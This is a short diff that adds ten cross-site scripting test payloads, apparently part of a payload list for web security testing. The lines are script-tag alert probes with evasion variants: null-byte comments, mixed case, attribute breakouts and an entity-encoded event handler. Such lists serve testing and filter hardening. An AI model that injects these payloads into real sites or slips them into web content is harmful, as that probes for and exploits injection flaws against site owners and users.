@@ -1,0 +1,10 @@
+<script /*%00*/>/*%00*/alert(1)/*%00*/</script /*%00*/
+<script>alert("XSS")</script>
+<script>alert("XSS");</script>
+<script>alert('XSS')</script>
+"><script>alert("XSS")</script>
+<script>alert(/XSS")</script>
+<script>alert(/XSS/)</script>
+</script><script>alert(1)</script>
+<ScRiPt>alert(1)</sCriPt>
+<input/onmouseover="javaSCRIPT&colon;confirm&lpar;1&rpar;"
